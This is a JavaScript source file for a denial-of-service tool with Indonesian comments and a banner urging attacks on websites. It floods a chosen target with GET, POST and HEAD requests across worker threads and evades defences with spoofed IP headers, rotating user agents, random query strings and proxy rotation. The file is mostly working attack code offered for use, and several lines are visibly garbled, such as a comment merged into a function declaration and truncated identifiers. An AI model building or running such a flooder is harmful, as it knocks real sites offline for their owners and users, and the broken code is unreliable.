import http from 'http';
import https from 'https';
import readline from 'readline-sync';
import chalk from 'chalk';
import ora from 'ora';
import { URL } from 'url';
import fs from 'fs';
import { Worker, isMainThread, parentPort, workerData } from 'worker_threads';

const asciiArt = `${chalk.redBright('██████╗ ███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗███████╗')}
${chalk.redBright('██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗ ████║██╔══██╗╚══██╔══╝██╔════╝')}
${chalk.redBright('██████╔╝█████╗  ██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  ')}
${chalk.redBright('██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  ')}
${chalk.redBright('██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║██║  ██║   ██║   ██║     ')}
${chalk.redBright('╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝     ')}
${chalk.white('                        TRAVAS ZLAZOR.88 DDOS V2')}
${chalk.cyan('  NOTE : GUNAKAN DENGAN TANGGUNG JAWAB SENDIRI. SERANG SEMUA WEB KEPARAT!!.')}`;

// User-Agent yang lebih luas dan realistis
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; L6_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S906N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
];

// Header acak untuk membingungkan server
const getRandomHeaders = () => {
    const randomHeaders = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': 'max-age=0',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'Pragma': 'no-cache'
    };
    
    // Tambahkan header acak tambahan
    const extraHeaders = {
        'X-Forwarded-For': Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
        'X-Real-Ip': Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
        'X-Originating-Ip': Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
        'Referer': `http://${Math.random().toString(36).substring(7)}.com/`,
        'Cookie': `session_id=${Math.random().toString(36).substring(7)}; user_pref=${Math.random().toString(36).substring(7)}`
    };
    
    return { ...randomHeaders, ...extraHeaders };
};

// Payload besar untuk serangan POST
const generateLargePayload = (sizeInMB) => {
    const sizeInBytes = sizeInMB * 1024 * 1024;
    const chunkSize = 1024;
    let payload = '';
    while (payload.length < sizeInBytes) {
        payload += Math.random().toString(36).repeat(chunkSize);
    }
    return payload.substring(0, sizeInBytes);
};

let stats = {
    totalRequests: 0,
    successfulRequests: 0,
    failedRequests: 0,
    errors: {}
};

// Fungsi serangan utama yang akan dijalankan di worker threation performAttack(workerData) {
    const { targetUrl, duration, method, proxyList, payloadSize } = workerData;
    const parsedUrl = new URL(targetUrl);
    const protocol = parsedUrl.protocol === 'https:' ? https : http;
    let proxyIndex = 0;

    const attackInterval = setInterval(() => {
        if (Date.now() > workerData.startTime + duration * 1000) {
            clearInterval(attackInterval);
            if (parentPort) parentPort.postMessage({ type: 'finished', stats: stats });
            return;
        }

        stats.totalRequests++;
        
        const options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
            path: parsedUrl.pathname + parsedUrl.search + `?t=${Date.now()}_${Math.random().toString(36).substring(7)}`,
            method: method,
            headers: getRandomHeaders(),
            timeout: 5000
        };

        // Gunakan proxy jika tersedia
        if (proxyList && proxyList.length > 0) {
            const proxy = proxyList[proxyIndex % proxyList.length];
            options.hostname = proxy.host;
            options.port = proxy.port;
            options.path = targetUrl; // Redirect request ke target melalui proxy
            options.headers['Host'] = parsedUrl.hostname; // Ganti host header ke target asli
            proxyIndex++;
        }

        const req = protequest(options, (res) => {
            stats.successfulRequests++;
            res.resume(); // Hapus data respons untuk menghemat memori
        });

        req.on('error', (err) => {
            stats.failedRequests++;
            const errorKey = err.code || err.message || 'Unknown Error';
            stats.errors[errorKey] = (stats.errors[errorKey] || 0) + 1;
        });

        // Kirim payload untuk metode POST
        if (method === 'POST') {
            const payload = generateLargePayload(payloadSize);
            req.write(payload);
        }

        req.end();
    }, 0); // Jalankan secepat mungkin
}

// Fungsi utama untuk menjalankan worker
async function attack(targetUrl, duration, methods, threads, proxyList, payloadSize) {
    const workers = [];
    const statsPerWorker = Array(threads).fill(null).map(() => ({
        totalRequests: 0,
        successfulRequests: 0,
        failedRequests: 0,
        errors: {}
    }));

    const spinner = ora({
        text: chalk.cyan(`Memulai serangan brutal...`),
        spinner: 'dots'
    }).start();

    const updateInterval = setInterval(() => {
        let totalSuccess = 0;
        let totalFail = 0;
        let totalTotal = 0;
        const allErrors = {};

        statsPerWorker.forEach(s => {
            totalSuccess += s.successfulRequests;
            totalFail += s.failedRequests;talTotal += s.totalRequests;
            for (const err in s.errors) {
                allErrors[err] = (allErrors[err] || 0) + s.errors[err];
            }
        });

        let statusText = `RPS: ${(totalTotal / ((Date.now() - startTime) / 1000)).toFixed(0)} | Sukses: ${totalSuccess} | Gagal: ${totalFail}`;
        if (Object.keys(allErrors).length > 0) {
            statusText += ` | Error: ${Object.keys(allErrors)[0]}`;
        }
        spinner.text = chalk.cyan(statusText);
    }, 500);

    const startTime = Date.now();

    for (let i = 0; i < threads; i++) {
        const worker = new Worker(__filename, {
            workerData: {
                targetUrl,
                duration,
                method: methods[i % methods.length],
                proxyList,
                payloadSize,
                startTime
            }
        });

        worker.on('message', (message) => {
            if (message.type === 'finished') {
                statsPerWorker[i] = message.stats;
                workers.splice(workers.indexOf(worker), 1);
                if (workers.length === 0) {
                    clearInterval(updateInterval);
                    spinner.stop();
                    displayFinalStats(statsPerWorker);
                }
            }
        });

        workers.push(worker);
    }
}

function displayFinalStats(allStats) {
    console.log(chalk.red('\n\n========================================='));
    console.log(chalk.red('SERANGAN SELESAI'));
    console.log(chalk.red('=========================================\n'));

    let grandTotal = 0;
    let grandSuccess = 0;
    let grandFail = 0;
    const allErrors = {};

    allStats.forEach(s => {
        grandTotal += s.totalRequests;
        grandSuccess += s.successfulRequests;
        grandFail += s.failedRequests;
        for (const err in s.errors) {
            allErrors[err] = (allErrors[err] || 0) + s.errors[err];
        }
    });

    console.log(chalk.green(`Total Permintaan: ${grandTotal.toLocaleString()}`));
    console.log(chalk.green(`Sukses: ${grandSuccess.toLocaleString()} (${((grandSuccess / grandTotal) * 100).toFixed(2)}%)`));
    console.log(chalk.red(`Gagal: ${grandFail.toLocaleString()} (${((grandFail / grandTotal) * 100).toFixed(2)}%)`));
    console.log(chalk.yellow(`Rata-rata Permintaan per Detik: ${(grandTotal / (duration || 1)).toFixed(0)}`));

    if (Object.keys(allErrors).length > 0) {
        console.log(chalk.yellow('\nDetail Kegagalan:'));
        for (const error in allErrors) {
            console.log(chalk.red(`  - ${error}: ${allErrors[error]} kali`));
        }
    }
    console.log(chalk.red('\nServer target telah diserang dengan brutal.'));
}

async function main() {
    if (!isMainThread) {
        performAttack(workerData);
        return;
    }

    while (true) {
        console.clear();
        console.log(asciiArt);
        console.log(chalk.yellow('Pilih metode serangan:\n1. GET Flood\n2. POST Flood (Payload Besar)\n3. HEAD Flood\n4. Serangan Bertingkat (GET+POST+HEAD)'));
        const methodChoice = readline.question(chalk.magenta('> '));

        let methods = [];
        let payloadSize = 0;

        if (methodChoice === '1') {
            methods = ['GET'];
        } else if (methodChoice === '2') {
            methods = ['POST'];
            payloadSize = parseInt(readline.question(chalk.magenta('Ukuran Payload (MB): ')), 10) || 10;
        } else if (methodChoice === '3') {
            methods = ['HEAD'];
        } else if (methodChoice === '4') {
            methods = ['GET', 'POST', 'HEAD'];
            payloadSize = parseInt(readline.question(chalk.magenta('Ukuran Payload POST (MB): ')), 10) || 10;
        } else {
            console.log(chalk.red('Pilihan tidak valid.'));
            continue;
        }

        const targetUrl = readline.question(chalk.magenta('Target URL/IP: '));
        const duration = parseInt(readline.question(chalk.magenta('Durasi (detik): ')), 10);
        const threads = parseInt(readline.question(chalk.magenta('Jumlah Thread: ')), 10);
        
        // Coba baca proxy dari file
        let proxyList = [];
        const proxyFile = readline.question('Gunakan Proxy? (namafile.txt atau tekan enter untuk tidak):'),
        if (proxyFile) {
            try {
                const proxyData = fs.readFileSync(proxyFile, 'utf8');
                proxyList = proxyData.split('\n').filter(line => line.trim()).map(line => {
                    const [host, port] = line.split(':');
                    return { host, port: parseInt(port, 10) };
                });
                console.log(chalk.green(`Memuat ${proxyList.length} proxy dari file.`));
            } catch (err) {
                console.log(chalk.red(`Gagal membaca file proxy: ${err.message}`));
            }
        }

        if (!targetUrl || isNaN(duration) || duration <= 0 || isNaN(threads) || threads <= 0) {
            console.log(chalk.red('Input tidak valid.'));
            await new Promise(resolve => setTimeout(resolve, 3000));
            continue;
        }

        await attack(targetUrl, duration, methods, threads, proxyList, payloadSize);

        const choice = readline.question(chalk.magenta('\n\n0. Keluar\n1. Serang Lagi\n> '));
        if (choice === '0') {
            process.exit(0);
        }
    }
}

if (isMainThread) {
    main();
}
